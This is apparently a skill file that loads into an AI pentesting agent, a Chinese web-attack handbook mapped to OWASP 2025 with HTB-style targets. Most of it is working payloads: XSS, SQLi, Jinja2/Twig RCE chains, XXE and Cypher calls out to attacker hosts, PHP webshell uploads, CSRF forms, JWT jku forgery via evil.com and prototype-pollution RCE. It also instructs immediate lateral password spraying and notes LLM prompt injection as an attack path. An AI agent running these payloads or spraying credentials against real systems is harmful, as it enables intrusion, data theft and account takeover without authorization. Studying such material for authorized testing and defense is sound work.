---
name: 'web-attacks'
description: 'Web 攻击综合手册：OWASP 2025 映射→技术栈识别→注入→SSRF→文件攻击→认证→CMS→2026 新趋势'
whenToUse: '目标有 HTTP/HTTPS 攻击面时：OWASP 2025 映射→技术栈识别→注入→SSRF→文件攻击→认证→CMS。'
metadata: { domain: web, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Web 攻击综合手册

> 🔴 **不自动加载。agent 需要时用 skill 工具按名加载 web-attacks，先读此索引定位目标章节。**

## 快速索引

| 场景 | 跳转 |
|------|------|
| 不知道是什么 CMS/框架 | §1 技术栈识别 |
| 找到 CMS 名字+版本 | §7 CMS/框架速查 (WordPress/Joomla/Drupal/...) |
| 有输入框/参数 | §3 注入攻击：SQLi / SSTI / XXE / 命令注入 / 反序列化 |
| 有文件上传 | §5 文件相关攻击 → 文件上传 |
| 需要绕过登录 | §6 认证攻击：JWT / Session / OAuth（JWT 高级见 §10.4）|
| URL 可以用来请求外部 | §4 SSRF |
| 可以读文件 (LFI/路径) | §5 文件相关攻击 → LFI / 路径遍历 |
| 反序列化 | §3 注入攻击 → 反序列化 |
| NoSQL 后端 | §3 NoSQL → 加载 mongodb-aggregation-injection 卡 |
| HTTP 走私 | §8 2025-2026 重点关注 → HTTP Request Smuggling |
| WebSocket | §9.5 WebSocket 注入 |
| 有 admin bot | §3 注入攻击 → XSS |
| 新发现的框架 (2025-2026) | §8 2025-2026 重点关注 |

## 0. OWASP Top 10 2025 速查

| # | 类别 | 检测方法 | 利用 |
|---|------|---------|------|
| A01 | Broken Access Control | 改 ID/role/URL 参数 | IDOR、垂直越权 |
| A02 | Security Misconfiguration | 默认页面/调试端点/目录列表 | 信息泄露→提权 |
| A03 | Software Supply Chain | 检查 package.json/composer.lock | 已知 CVE 依赖 |
| A04 | Cryptographic Failures | 明文传输/弱算法/硬编码密钥 | 密码破解/JWT 伪造 |
| A05 | Injection | 输入 `' OR 1=1--` / `{{7*7}}` / `` `id` `` | SQLi/SSTI/命令注入 |
| A06 | Insecure Design | 工作流绕过/竞争条件 | 多步流程跳过 |
| A07 | Authentication Failures | 弱密码策略/无速率限制 | 爆破/凭据填充 |
| A08 | Software & Data Integrity | 无签名验证/不安全反序列化 | 反序列化 RCE |
| A09 | Security Logging Failures | N/A (蓝队项) | - |
| A10 | Mishandling Exceptional Conditions | 触发错误观察响应 | 错误信息泄露/SSRF |

---

## 1. 技术栈识别（阶段 A）

```
[ ] HTTP 响应头: Server / X-Powered-By / X-Generator / Set-Cookie (PHPSESSID etc)
[ ] HTML 源码: generator / wp-content / version
[ ] 默认文件: robots.txt / sitemap.xml / composer.json / package.json
[ ] 默认路径: /wp-admin /administrator /wp-login.php /user/login
[ ] JS chunks: grep -E '(version|Version|VER|build|api|endpoint)' *.js
[ ] Favicon hash: curl -s favicon.ico | md5sum → 查 Fingerprint 库
[ ] 404/错误页面特征 → 框架识别
[ ] 🆕 Laravel 检测: /_debugbar/ → debugbar 泄露; Set-Cookie: krayin_crm_session= → Krayin CRM
```

## 2. 攻击面穷举（阶段 B）

### 目录 & Vhost 爆破

```
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u <URL> -H "Host: FUZZ.target.htb" -w <vhost_wordlist> -fs <错误响应大小>
```

### API 端点发现

```
[ ] /api/ /graphql /rest/ /swagger /docs /openapi /v1/ /v2/
[ ] JS chunks 中搜: api/ fetch( axios( endpoint baseUrl
[ ] graphql 内省: __schema { types { name } }
```

### 隐藏参数

```
[ ] param-miner / arjun: 发现隐藏 GET/POST 参数
[ ] 每个参数: 多一个/少一个/类型不对 → 看报错差异
[ ] HTTP 方法切换: GET→POST→PUT→PATCH→DELETE→OPTIONS
```

---

## 3. 注入攻击（阶段 C）

### XSS（跨站脚本）— 🔴 最基础、最高频
```
# Reflected XSS — 输入直接回显在页面
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<a href="javascript:alert(1)">click</a>

# Stored XSS — 输入存入服务器，其他用户访问时触发
# 目标: 留言/评论/用户名/文件 → 持久存储

# DOM XSS — 纯客户端，JS 读 URL hash/参数写入 innerHTML
# 搜: document.write / innerHTML / eval / location.hash / $

# WAF 绕过:
<ScRiPt>alert(1)</ScRiPt>                          # 大小写
< img src=x onerror=alert(1)>                       # 空格/空字节
<scr<script>ipt>alert(1)</scr</script>ipt>          # 嵌套拆分

# 🔴 每个输入点先丢 <script>alert(1)</script>，再看是否需要绕过
```

### SQL 注入

```
' OR 1=1-- / ' OR '1'='1'-- / admin'-- / admin' #
' UNION SELECT 1,2,3-- / ' UNION SELECT NULL--
' AND SLEEP(5)-- (盲注)
sqlmap -u <URL> --risk=3 --level=5 --batch
```

### 🆕 Cypher Injection (Neo4j)

> 见 cypher-injection — Neo4j UNION + LOAD CSV SSRF/OOB

```cypher
' RETURN 1 AS x UNION CALL db.labels() YIELD label AS x RETURN x//
' RETURN 1 AS x UNION LOAD CSV FROM 'http://attacker/'+x AS y RETURN ''//
```

### SSTI（服务端模板注入）

```
{{7*7}} → 49? 确认 SSTI
${7*7} / <%= 7*7 %> / #{7*7}

Jinja2:    {{ config.items() }} {{ ''.__class__.__mro__[1].__subclasses__() }}  # Py3: [1]=object; Py2用[2]
Twig:      {{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
FreeMarker: ${"freemarker.template.utility.Execute"?new()("id")}
Smarty:    {Smarty_Internal_Write_File::writeFile(["rce.php","<?php system($_GET['cmd']);?>"])}

🔴 Jinja2 RCE 全链:
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
（沙箱逃逸见 python-sandbox-escape 卡）

### 命令注入

```
; id / | id / || id / && id / `id` / $(id)
换行注入: %0a id
绕过空格: ${IFS} / %09 / <>/<>  # 见 cmd-injection-exit-code-precheck
```

### XXE

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/oob">]>  <!-- OOB -->
```
（高级 XXE/XInclude/fontTools CDATA 见 xml-attacks-beyond-xxe 卡）

### 反序列化

> 见 dotnet-pipe-yaml-deserialization（.NET）与 python-sandbox-escape（Python）

---

## 4. SSRF（阶段 D）

> 见 ssrf-protocol-matrix 全协议矩阵

```
file:///etc/passwd  /  file:///C:/Windows/win.ini
http://127.0.0.1:<port>  → 内网端口扫描
gopher://127.0.0.1:6379/_INFO  → Redis
dict://127.0.0.1:11211/stats   → Memcached
netdoc://  (Java SSRF)
```

---

## 5. 文件相关攻击

### LFI / 路径遍历

```
../../etc/passwd / ....//....//etc/passwd / ..\/..\/windows/win.ini
php://filter/convert.base64-encode/resource=index
php://filter/write=convert.base64-decode/resource=shell.php  (需配合 POST body 传 base64 内容)
expect://id / data://text/plain,<?php system('id');?>
```
（LFI→RCE 污染链见 log-poisoning-lfi-rce 卡）

### 文件上传

```
扩展名绕过: .php5 .phtml .phar .shtml .pht .php. .pHP .jspx .JSP
内容绕过: GIF89a;<?php system($_GET['c']);?>
.htaccess: AddType application/x-httpd-php .evil
config 文件: 覆盖 /etc/nginx/sites-enabled/default / .htaccess
ZIP slip: ../../../var/www/html/shell.php 在 ZIP 内
SVG XSS: <svg><script>alert(1)</script></svg> → 上传 .svg 可直接执行 JS
```

🆕 **常见上传端点（不限于标准文件上传功能）**:
```
TinyMCE/富文本编辑器: /admin/tinymce/upload, /filemanager/upload, /editor/upload
头像上传: /profile/avatar, /user/photo
邮件附件: /mail/compose/attach → CVE-2026-36340 (Krayin)
导入功能: /import, /admin/import → CSV/XLSX → 可能触发公式注入或 PHP
Logo/设置: /admin/settings/logo, /configuration/appearance
```
→ 每个上传端点直接试 `.php` 扩展名，不要假设有验证

---

## 6. 认证攻击

```
[ ] 默认凭据 → default-credentials
[ ] 注册功能 → 权限提升（注册即 admin？）
[ ] 密码重置 → Token 可猜？/ Host header 投毒
[ ] 记住我 → Cookie 可解码/伪造？
[ ] JWT → 改 alg=none / 弱密钥爆破 / kid 注入 / jku 伪造 (详见 §10.4)
[ ] Flask session → 弱 secret → flask-session-forgery
[ ] OAuth → redirect_uri 开放重定向 → 窃取 code
```

🆕 **正确的认证攻击流程**:
1. **版本识别 → 搜 CVE**（在登录之前！不要登录后才搜）
2. **如果 CVE 是 auth-required → 优先找凭证**：Git 历史 / 默认密码 / `.env` / 密码复用
3. **登录** → 执行已知 CVE exploit → 拿到 shell 后凭据喷洒其他服务 → credential-spraying-password-reuse
4. 🔴 **反模式**: 登录后"探索"应用功能手工找上传点 → 应该登录前就知道要打哪个端点

---
### CSRF（跨站请求伪造）+ SameSite / SOP / 跨域

#### 基础攻击
```
# 原理: 诱骗已登录用户访问恶意页面 → 以用户身份执行操作

# 检测 — 找无 CSRF token 的状态变更请求:
POST /change-password  (无 csrf token → 可伪造)
POST /transfer         (无 Origin/Referer 验证)

# 利用 — 托管恶意 HTML:
<form action="https://target.com/change-password" method="POST">
  <input name="new_password" value="attacker123">
</form>
<script>document.forms[0].submit()</script>

# Token 绕过:
# - 删掉 token 参数 → 后端可能跳过验证
# - 用空值: csrf_token=
# - 换成同长度随机值 → 可能只验证长度非值
# - 用 GET 替代 POST → 绕过 token 检查
```

#### SameSite Cookie 深度绕过
```
# SameSite 三种模式:
# Strict → cookie 绝不跨站发送 (最安全，最难利用)
# Lax    → 仅"顶级导航 GET"跨站发送 (<a>点击 / window.open)
# None   → 跨站任意发送 (必须同时设 Secure，HTTPS only)

# 🔴 SameSite Lax 绕过 — 方法 1: GET 请求
# 后端不区分 GET/POST → 直接 GET 执行状态变更
<a href="https://target.com/change-password?new=attacker">click me</a>

# 🔴 SameSite Lax 绕过 — 方法 2: method override
# 框架支持 _method 参数或 X-HTTP-Method-Override 头
<form action="https://target.com/endpoint?_method=POST" method="GET">
  <input name="new_password" value="attacker123">
</form>

# 🔴 SameSite Lax 绕过 — 方法 3: window.open 导航
# 新窗口打开依然是顶级导航，cookie 会被发送
<script>
var w = window.open("https://target.com/form");
setTimeout(() => w.document.forms[0].submit(), 2000);
</script>

# 🔴 SameSite Lax 绕过 — 方法 4: 2分钟窗口 (Chrome Lax+POST)
# cookie 被更新后的 2 分钟内 → Lax 降级为 None → POST 也带 cookie
# 触发: 先让受害者访问一个登出页面 (清除 cookie) → 再登入 (重新设置)
# → 登入后的 2 分钟窗口内 → POST CSRF 可行

# 🔴 SameSite Strict 绕过 — 客户端重定向链
# popup → redirect → 最终页面在目标域下的 form → 自动 submit
# 因为最终 form submit 发生在目标域内，Strict cookie 也被发送
```

#### SOP（同源策略）速查
```
# 同源定义: scheme + host + port 三者完全相同
# https://app.com:443 ≠ http://app.com (scheme不同)
# https://app.com      ≠ https://sub.app.com (host不同)

# SOP 阻止: 跨域读 (response body / DOM / cookie / localStorage)
# SOP 不阻止: 跨域写 (form POST / link click) ← CSRF 存在的基础

# CORS 是 SOP 的"放松"机制:
# Access-Control-Allow-Origin: https://evil.com → 允许指定域跨域读
# Access-Control-Allow-Credentials: true       → 允许带 cookie 跨域
# 🔴 Origin 反射 + Allow-Credentials → 可以带 cookie 跨域读 → 信息窃取

# Sec-Fetch 请求头 (现代浏览器自动发送):
# Sec-Fetch-Site: cross-site → 来自其他站点的请求 → 后端应拒绝状态变更
# Sec-Fetch-Mode: navigate → 导航请求 (GET) | no-cors → form POST
# Sec-Fetch-Dest: iframe → 来自 iframe → 拒绝或加验证
# 🔴 防御: 后端检查 Sec-Fetch-Site != same-origin → 拒绝非安全方法

# CSWSH (Cross-Site WebSocket Hijacking):
# WebSocket 握手不受 SOP 严格限制 → 无 Origin 检查 → 劫持
# SameSite cookie 不保护 WebSocket → 即使 Strict 也发送
```

---

## 7. CMS / 框架速查

```
WordPress:   wpscan --url <URL> --enumerate p,t,u,vp,vt
Joomla:      /administrator/manifests/files/joomla.xml
Drupal:      /CHANGELOG.txt → 版本 → CVE
Magento:     /magento_version
Laravel:     .env 泄露 / debug mode → CVE-2021-3129 RCE
🆕 Krayin CRM: /admin/login → CVE-2026-38526 TinyMCE 上传 RCE; Set-Cookie: krayin_crm_session=
Spring Boot: /actuator /heapdump /env
Django:      debug mode → settings 泄露
Tomcat:      /manager/html → 弱密码爆破
```

> 完整 25+ CMS 列表见 cms-framework-rce

---

## 8. 🔴 2025-2026 Web 重点关注

- **"Successful Errors"** — 2025 #1 Web Hack：利用 JS 错误处理触发 SSTI/代码注入
- **Next.js middleware 绕过** — 认证逻辑被跳过
- **Cache poisoning** — 通过 Host header 变异毒化 CDN
- **AI/LLM 注入** — 通过 Web 接口注入 prompt → 后端工具调用链
- **HTTP/2 Rapid Reset** — DDoS 变种，但可用于请求走私
- 🆕 **HTTP Request Smuggling** — HAProxy+Gunicorn/ALB+IIS → CL.TE/TE.CL desync → Session hijack / Cache poison → http-request-smuggling
- 🆕 **WebAuthn XSS** — credential.name 不转义 → JS 注入 → 攻击者 Passkey 绑定 admin → webauthn-xss

## 9. 🆕 PHP Type Juggling / Prototype Pollution / Race Condition

### 9.1 PHP Type Juggling（松散比较 0e 哈希）
```
# PHP == 是松散比较，"0e1234" == "0e5678" → true (都解析为 0e 科学记数法 = 0)
# 利用: 注册密码为 0e 开头 MD5 值 → 登录时密码碰撞

# 常见 0e 开头 MD5:
# 240610708 → 0e462097431906509019562988736854
# QNKCDZO  → 0e830400451993494058024219903391
# s878926199a → 0e545993274517709034328855841020
# 更多: https://github.com/spaze/hashes

# 检测: curl -X POST /login -d "user=admin&password=240610708"
# 如果注册时密码 hash 也是 0e 开头 → 认证绕过

# 同样影响: sha1('aaroZmOk') = 0e 开头 → sha1 松散比较绕过
```

### 9.2 Node.js Prototype Pollution
```
# 来源: 深度 merge / Object.assign / 递归拷贝不加过滤

# 检测 payload:
Content-Type: application/json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

# 常见 sink → RCE:
# 1. child_process.fork / spawn 的 env/options
# 2. ejs render → 注入 opts.escapeFunction → 代码执行
# 3. lodash _.template → 注入 sourceURL

# EJS RCE:
{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id');//"}}
```
（完整见 prototype-pollution 卡）

### 9.3 Race Condition（竞态条件）
```
# 场景: 并发请求绕过速率限制 / 多步流程 / 优惠券/代金券多次使用

# Turbo Intruder (Burp 插件) — 首选
# 请求组 → single-packet attack → 并发发送 → 全部在同一 TCP 窗口到达

# curl 并发 (bash):
for i in {1..20}; do
  curl -s -X POST https://target.com/apply -d "code=GIFT100" &
done
wait

# 🔴 常见 race 目标:
# - 重置密码: 并发请求旧 token + 新密码
# - 文件上传: 上传 + 访问之间竞态执行
# - 优惠券: 并发多次使用同一 code
# - 限购: 并发添加同一商品到购物车
```

### 9.4 GraphQL 深度利用
```
# 当前只覆盖了 introspection。更多:

# Batching attack — 绕过速率限制
# 多个 mutation 在同一请求中批量执行
[{"query":"mutation { addAdmin }"},{"query":"mutation { addAdmin }"}]

# 别名绕过 — 同字段多次查询
query { a:user(id:1){name} b:user(id:2){name} c:user(id:3){name} }

# 嵌套 DoS → 信息泄露
query { user { posts { author { posts { author { posts { name } } } } } }

# 内省过滤绕过: __schema → __type → __schema (循环)
```

### 9.5 WebSocket 注入
```
# WebSocket 是持久连接，消息格式通常是 JSON
# 如果服务端信任客户端消息内容且未做验证:

# 注入测试:
ws.send('{"action":"read","file":"../../../etc/passwd"}')
ws.send('{"action":"exec","cmd":"id"}')

# 🔴 常见漏洞: SQLi via WebSocket / 无 Origin 检查 → CSWSH
```

## 10. 🆕 2025-2026 新增攻击面（网络搜索验证缺口）

### 10.1 gRPC 渗透
```
# 发现 — 端口通常是 50051 或 443 后面挂 gRPC-Web
nmap -p 50051 --script grpc-discovery <IP>

# 反射枚举 (如果 reflection 开启)
grpcurl -plaintext <IP>:50051 list
grpcurl -plaintext <IP>:50051 describe <Service>
grpcurl -plaintext -d '{}' <IP>:50051 <Service>/<Method>

# 反射关闭 → 盲枚举
grpc-scan -target <IP>:50051                    # 自动猜 service/method 名
# 错误码区分: UNIMPLEMENTED vs NOT_FOUND vs PERMISSION_DENIED
# → 可以确认 service 和 method 是否存在

# Proto 文件发现
find . -name '*.proto' -o -name 'pb.go' -o -name '_grpc.py'

# 元数据注入 — tenant/role 常放在 metadata 中
grpcurl -H 'x-tenant-id: tenant-b' -d '{"id":"1"}' <IP>:50051 Service/GetItem
# → 租户隔离绕过 → IDOR

# gRPC-Web (浏览器端): 绕过同源限制 → 检查 CORS preflight
curl -X OPTIONS https://target/grpc -H 'Origin: https://evil.com'
# → Access-Control-Allow-Credentials: true + Origin 反射 → CSWSH
```

### 10.2 Unicode Normalization 攻击（2025 #4 Web Hack）
```
# 原理: 不同层对 Unicode 做不同 normalization → 绕过过滤
# 例: \u212A (KELVIN SIGN) → NFC归一化 → "k" (普通 ASCII)

# WAF/过滤器绕过:
# <script> → <ſcript> (ſ = ſ LATIN SMALL LETTER LONG S)
# ../etc/passwd → ..\uFF0Fetc\uFF0Fpasswd (全角／→归一化→/)
# ③④⑤.⓪.⓪.① → 仅 NET/Java best-fit 平台会转ASCII，非通用NFC
# NFC通用: 全角／(U+FF0F)→半角/，㎞(U+339E)→"km"

# 常见利用场景:
# - SQLi: ' OR 1=1 → ＇　ＯＲ　１＝１ (全角→归一化→半角)
# - SSRF: http://169.254.169.254 → http://ⓛⓔⓣⓐ (圈字母→归一化)
# - XSS: <img src=x onerror=alert(1)> → 用 homoglyph 替换尖括号

# 检测: 如果页面正确回显了你的 Unicode → 后端可能做了归一化
# 工具: recollapse (fuzz Unicode normalization), Burp ActiveScan++
```

### 10.3 CSTI — 客户端模板注入
```
# 与 SSTI 的区别: 模板在浏览器端渲染 (AngularJS / Vue.js / Mavo)

# AngularJS (<1.6 有沙箱)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

# AngularJS 1.6+ (无沙箱 — 直接执行)
{{constructor.constructor('alert(1)')()}}

# Vue.js
{{constructor.constructor('alert(1)')()}}                # V2
{{_openBlock.constructor('alert(1)')()}}                   # V3

# Mavo
[if(docuⅿent.URL.match(/xss/))al\u0065rt(1)]

# 🔴 关键: CSTI 不需要 HTML 注入 — 只注入模板表达式即可 XSS
# → 可绕过 strip_tags / htmlspecialchars 等 HTML 层防御
```

### 10.4 JWT 高级攻击（补充 §6）
```
# 除了 alg:none，还有:

# jku 注入 — 指向攻击者 JWKS
# 1. openssl genrsa -out priv.pem 2048
# 2. openssl rsa -in priv.pem -pubout > pub.pem
# 3. cat pub.pem | pem-jwk > jwks.json (托管到攻击者服务器)
# 4. JWT header: {"alg":"RS256","jku":"https://evil.com/jwks.json"}
# 5. 用 priv.pem 签名 → 服务器从 evil.com 取公钥验证 → 通过

# kid 注入 — 如果 kid 直接拼接到文件路径
# {"alg":"RS256","kid":"../../../dev/null"} → 读空文件 → 空密钥
# {"alg":"RS256","kid":"/etc/passwd"} → 读到已知内容当密钥

# 检测: jwt_tool <token> -X s -ju https://evil.com/jwks.json
```

### 10.5 Mass Assignment / BOLA / IDOR
```
# Mass Assignment — 批量赋值绕过权限
# 注册时只让你填 name/email，但后端接受 isAdmin
POST /api/register
{"name":"attacker","email":"a@a.com","isAdmin":true}

# BOLA (Broken Object Level Authorization) — 改 ID 访问他人资源
GET /api/users/123/profile → 200 OK
GET /api/users/124/profile → 200 OK (别人的数据)
# 自动化: 创建 2 个账户 → A 的 token 访问 B 的资源

# IDOR 参数 fuzz:
# /doc?file=report_1.pdf → /doc?file=report_2.pdf
# /invoice/INV-2025-0001 → /invoice/INV-2025-0002
# GUID 不可猜但泄露在页面源码/JS/API 响应中

# 方法切换绕过:
GET /admin/users → 403
PUT /admin/users → 200 (PUT 没做权限检查)
PATCH /users/123 {"role":"admin"} → 200
```

### 10.6 mXSS — 突变 XSS
```
# 原理: sanitizer 解析 HTML → 输出 → 浏览器重新解析时发生"突变"
# sanitizer 看到的是安全版本，浏览器渲染出来的是恶意版本

# 经典模式: <style> 标签内嵌攻击
<svg><style></style><img src=x onerror=alert(1)>

# DOMPurify 绕过示例 (注意: 补丁后已修复，思路可复用)
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

# 🔴 检测思路: 输入特殊 HTML 结构 → 看 sanitizer 输出 → 对比浏览器渲染
# 工具: mXSS cheatsheet (HackMD) / DOMPurify bypass payload 集合
```

### 10.7 DOM Clobbering
```
# 原理: HTML 元素 id/name 覆盖 JS 全局变量
<img id="alert" src=x>  →  window.alert 现在是 HTMLImageElement

# 经典利用链:
# 1. 找 JS 代码用未定义变量，如 if(config.debug) { loadScript(config.url) }
# 2. 注入 <a id="config" name="url" href="//evil.com/evil.js">
# 3. config.url → HTMLAnchorElement.href → evil.com/evil.js

# 双元素 clobber (覆盖嵌套属性):
<a id="x"><a id="x" name="y" href="//evil.com/payload.js">
# → window.x.y = "//evil.com/payload.js"

# 🔴 常见 sink: script.src / iframe.src / fetch(url) / import(src)
```

### 10.8 速查: SAML / CORS / Open Redirect / HTTP/2
```
# SAML — XML Signature Wrapping
# 在 SAMLResponse 中注入第二个被篡改的 Assertion
# → 验签取第一个，授权取第二个 → 提权

# CORS 深度 — 不只检查 Origin 反射
# Access-Control-Allow-Credentials: true + Origin 反射 → 凭证窃取
# Access-Control-Allow-Origin: null → sandboxed iframe 利用

# Open Redirect 链 — 不止于钓鱼
# /oauth/callback?redirect_uri=//evil.com → 窃取 OAuth code
# /redirect?url=javascript:alert(1) → XSS (特殊浏览器)

# HTTP/2 — CONNECT 隧道 + HPACK bomb
# CONNECT 方法可绕过反向代理访问内部端口
# HPACK 压缩炸弹DDoS (HTTP/2 头部压缩)
```

## 快速优先级

| 优先级 | 检测项 | 信号 |
|--------|--------|------|
| 🔴 1 | 技术栈版本 | 每个版本号 → searchsploit |
| 🔴 2 | 注入/XSS | `'` `<script>` `{{7*7}}` `` `id` `` — XSS/SQLi/SSTI/命令注入 每个输入点都测 |
| 🔴 3 | 默认凭据 | admin/admin, root/root, 软件名/软件名 |
| 🔴 4 | 文件上传 | 扩展名绕过 + SVG XSS + TinyMCE/media 端点 |
| 🟠 5 | SSRF | URL 参数 → file:// → gopher:// → dict:// → 内网扫描 |
| 🟠 6 | LFI | file=/page= 参数 → ../etc/passwd + php://filter chain |
| 🟡 7 | JWT/Flask | session 解码 → alg:none / jku / 弱密钥 (详见 §6 + §10.4) |
| 🟡 8 | API 端点 | /api/ /graphql → Mass Assignment / BOLA / IDOR fuzz |
| 🟡 9 | gRPC | 50051 → grpcurl 反射枚举 / 元数据注入 (§10.1) |
| 🟡 10 | Unicode | WAF 归一化绕过 → homoglyph / 全角 fuzz (§10.2) |
| 🟡 11 | XSS高级 | CSTI / mXSS / DOM Clobbering (§10.3/10.6/10.7) |
| 🆕 P0 | 版本识别成功 | **立即 searchsploit + GitHub Advisory 搜 CVE**（不管有没凭证） |
| 🆕 P0.5 | CVE 需认证 + 无凭证 | **优先找凭证**（Git/默认密码/.env/复用），不要手工探测应用功能 |
| 🆕 P0.8 | 🔴 拿到任何密码 | **立即横向喷洒** → credential-spraying-password-reuse |
